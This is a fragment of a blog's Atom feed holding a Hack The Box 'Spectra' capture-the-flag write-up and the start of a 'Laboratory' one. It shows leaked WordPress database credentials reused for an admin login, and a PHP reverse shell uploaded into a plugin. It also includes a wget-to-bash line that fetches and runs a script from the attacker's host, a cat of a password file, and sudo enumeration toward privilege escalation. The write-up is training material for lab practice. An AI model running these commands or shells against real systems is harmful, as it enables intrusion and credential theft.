+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&amp;gt;&lt;/span&gt;http://spectra.htb/main&lt;span class=&quot;nt&quot;&gt;&amp;lt;/link&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;description&amp;gt;&lt;/span&gt;Just another WordPress site&lt;span class=&quot;nt&quot;&gt;&amp;lt;/description&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;lastBuildDate&amp;gt;&lt;/span&gt;Mon, 29 Jun 2020 22:16:37 +0000&lt;span class=&quot;nt&quot;&gt;&amp;lt;/lastBuildDate&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;sy:updatePeriod&amp;gt;&lt;/span&gt;
+	hourly	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/sy:updatePeriod&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;sy:updateFrequency&amp;gt;&lt;/span&gt;
+	1	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/sy:updateFrequency&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;generator&amp;gt;&lt;/span&gt;https://wordpress.org/?v=5.4.2&lt;span class=&quot;nt&quot;&gt;&amp;lt;/generator&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;item&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;
+		Comment on Hello world! by A WordPress Commenter		&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;link&amp;gt;&lt;/span&gt;http://spectra.htb/main/?p=1#comment-1&lt;span class=&quot;nt&quot;&gt;&amp;lt;/link&amp;gt;&lt;/span&gt;
+
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;dc:creator&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;![CDATA[A WordPress Commenter]]&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/dc:creator&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;pubDate&amp;gt;&lt;/span&gt;Mon, 29 Jun 2020 22:16:37 +0000&lt;span class=&quot;nt&quot;&gt;&amp;lt;/pubDate&amp;gt;&lt;/span&gt;
+		&lt;span class=&quot;nt&quot;&gt;&amp;lt;guid&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;isPermaLink=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;false&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;http://10.10.10.90/sites/dev/?p=1#comment-1&lt;span class=&quot;nt&quot;&gt;&amp;lt;/guid&amp;gt;&lt;/span&gt;
+
+					&lt;span class=&quot;nt&quot;&gt;&amp;lt;description&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;![CDATA[Hi, this is a comment.
+To get started with moderating, editing, and deleting comments, please visit the Comments screen in the dashboard.
+Commenter avatars come from &amp;amp;lt;a href=&amp;amp;quot;https://gravatar.com&amp;amp;quot;&amp;amp;gt;Gravatar&amp;amp;lt;/a&amp;amp;gt;.]]&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/description&amp;gt;&lt;/span&gt;
+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;content:encoded&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;![CDATA[&amp;lt;p&amp;gt;&lt;/span&gt;Hi, this is a comment.&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+To get started with moderating, editing, and deleting comments, please visit the Comments screen in the dashboard.&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&lt;/span&gt;
+Commenter avatars come from &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://gravatar.com&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Gravatar&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
+]]&amp;gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/content:encoded&amp;gt;&lt;/span&gt;
+		
+			&lt;span class=&quot;nt&quot;&gt;&amp;lt;/item&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/channel&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/rss&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And also lets launch a wpscan at the box to find usernames and plugins: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wpscan --url spectra.htb/main -e vp,u --plugins-detection aggressive --plugins-version-detection aggressive&lt;/code&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;dir-listing&quot;&gt;Dir Listing&lt;/h2&gt;
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://spectra.htb/testing&lt;/code&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://spectra.htb/testing/wp-config.php.save&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;span class=&quot;cd&quot;&gt;/**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the
+ * installation. You don't have to use the web site, you can
+ * copy this file to &quot;wp-config.php&quot; and fill in the values.
+ *
+ * This file contains the following configurations:
+ *
+ * * MySQL settings
+ * * Secret keys
+ * * Database table prefix
+ * * ABSPATH
+ *
+ * @link https://wordpress.org/support/article/editing-wp-config-php/
+ *
+ * @package WordPress
+ */&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;// ** MySQL settings - You can get this info from your web host ** //&lt;/span&gt;
+&lt;span class=&quot;cd&quot;&gt;/** The name of the database for WordPress */&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'DB_NAME'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'dev'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;cd&quot;&gt;/** MySQL database username */&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'DB_USER'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'devtest'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;cd&quot;&gt;/** MySQL database password */&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'DB_PASSWORD'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'devteam01'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;cd&quot;&gt;/** MySQL hostname */&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'DB_HOST'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'localhost'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;cd&quot;&gt;/** Database Charset to use in creating database tables. */&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'DB_CHARSET'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'utf8'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;cd&quot;&gt;/** The Database Collate type. Don't change this if in doubt. */&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'DB_COLLATE'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;cd&quot;&gt;/**#@+
+ * Authentication Unique Keys and Salts.
+ *
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'AUTH_KEY'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;         &lt;span class=&quot;s1&quot;&gt;'put your unique phrase here'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'SECURE_AUTH_KEY'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;  &lt;span class=&quot;s1&quot;&gt;'put your unique phrase here'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'LOGGED_IN_KEY'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;    &lt;span class=&quot;s1&quot;&gt;'put your unique phrase here'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'NONCE_KEY'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;        &lt;span class=&quot;s1&quot;&gt;'put your unique phrase here'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'AUTH_SALT'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;        &lt;span class=&quot;s1&quot;&gt;'put your unique phrase here'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'SECURE_AUTH_SALT'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'put your unique phrase here'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'LOGGED_IN_SALT'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;   &lt;span class=&quot;s1&quot;&gt;'put your unique phrase here'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'NONCE_SALT'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;       &lt;span class=&quot;s1&quot;&gt;'put your unique phrase here'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;cd&quot;&gt;/**#@-*/&lt;/span&gt;
+
+&lt;span class=&quot;cd&quot;&gt;/**
+ * WordPress Database Table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ */&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$table_prefix&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'wp_'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;cd&quot;&gt;/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the documentation.
+ *
+ * @link https://wordpress.org/support/article/debugging-in-wordpress/
+ */&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'WP_DEBUG'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;cm&quot;&gt;/* That's all, stop editing! Happy publishing. */&lt;/span&gt;
+
+&lt;span class=&quot;cd&quot;&gt;/** Absolute path to the WordPress directory. */&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;defined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ABSPATH'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;nb&quot;&gt;define&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'ABSPATH'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;__DIR__&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/'&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;cd&quot;&gt;/** Sets up WordPress vars and included files. */&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;require_once&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;ABSPATH&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'wp-settings.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Logging in with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;administrator:devteam01&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;revshell: http://pentestmonkey.net/tools/web-shells/php-reverse-shell&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/htb/spectra/plugin-web-shell.png&quot; alt=&quot;Web shell uploaded in the akismet plugin.&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;local-enumeration&quot;&gt;Local Enumeration&lt;/h2&gt;
+
+&lt;p&gt;Linpeas:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;whereis wget
+wget: /usr/local/bin/wget
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/local/bin/wget http://10.10.14.104:8000/linpeas.sh &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; - | /bin/bash
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.3&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/autologin/passwd
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/autologin/passwd
+SummerHereWeCome!!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;prive-esc&quot;&gt;Prive Esc&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Checking &lt;span class=&quot;s1&quot;&gt;'sudo -l'&lt;/span&gt;, /etc/sudoers, and /etc/sudoers.d
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+User katie may run the following commands on spectra:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; SETENV: NOPASSWD: /sbin/initctl
+...[snip]...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Interesting GROUP writable files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;not &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;Home&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;max 500&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files 
+  Group katie:
+/tmp/screen
+  Group developers:
+/etc/init/test6.conf
+/etc/init/test7.conf
+/etc/init/test3.conf
+/etc/init/test4.conf
+/etc/init/test.conf 
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name></name></author><category term="htb" /><summary type="html">Scanning &amp;amp; Enumeration I started with an nmap scan, which showed a few open port. It seems Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-24 09:58 EDT Nmap scan report for 10.10.10.229 Host is up (0.025s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.1 (protocol 2.0) | ssh-hostkey: |_ 4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA) 80/tcp open http nginx 1.17.4 |_http-server-header: nginx/1.17.4 |_http-title: Site doesnt have a title (text/html). 3306/tcp open mysql MySQL (unauthorized) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) 8081/tcp open blackice-icecap? | fingerprint-strings: | FourOhFourRequest, GetRequest: | HTTP/1.1 200 OK | Content-Type: text/plain | Date: Sat, 24 Apr 2021 14:09:19 GMT | Connection: close | Hello World | HTTPOptions: | HTTP/1.1 200 OK | Content-Type: text/plain | Date: Sat, 24 Apr 2021 14:09:24 GMT | Connection: close |_ Hello World 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8081-TCP:V=7.91%I=7%D=4/24%Time=608423F9%P=x86_64-pc-linux-gnu%r(Ge SF:tRequest,71,&quot;HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain\r\nD SF:ate:\x20Sat,\x2024\x20Apr\x202021\x2014:09:19\x20GMT\r\nConnection:\x20 SF:close\r\n\r\nHello\x20World\n&quot;)%r(FourOhFourRequest,71,&quot;HTTP/1\.1\x2020 SF:0\x20OK\r\nContent-Type:\x20text/plain\r\nDate:\x20Sat,\x2024\x20Apr\x2 SF:02021\x2014:09:19\x20GMT\r\nConnection:\x20close\r\n\r\nHello\x20World\ SF:n&quot;)%r(HTTPOptions,71,&quot;HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/p SF:lain\r\nDate:\x20Sat,\x2024\x20Apr\x202021\x2014:09:24\x20GMT\r\nConnec SF:tion:\x20close\r\n\r\nHello\x20World\n&quot;);</summary></entry><entry><title type="html">Laboratory Write-Up</title><link href="/htb/laboratory" rel="alternate" type="text/html" title="Laboratory Write-Up" /><published>2021-04-16T23:44:00+02:00</published><updated>2021-04-16T23:44:00+02:00</updated><id>/htb/laboratory</id><content type="html" xml:base="/htb/laboratory">&lt;p&gt;This is my writeup of the laboratory machine on Hack The Box. Eventhough the box was rated easy, I found getting a foothold quite hard. I exploited 2 GitLab vulnerabilties to gain a foothold. Leveraging the foothold; I get access to the GitLab admin account that contained a private SSH key. Using the SSH key I get access to the machine and gain root privileges by exploit a SUID binary that uses relative paths. Overall a fun machine that shows how dangerous LFI can be when chained with deserialization.&lt;/p&gt;
 
 &lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;
 
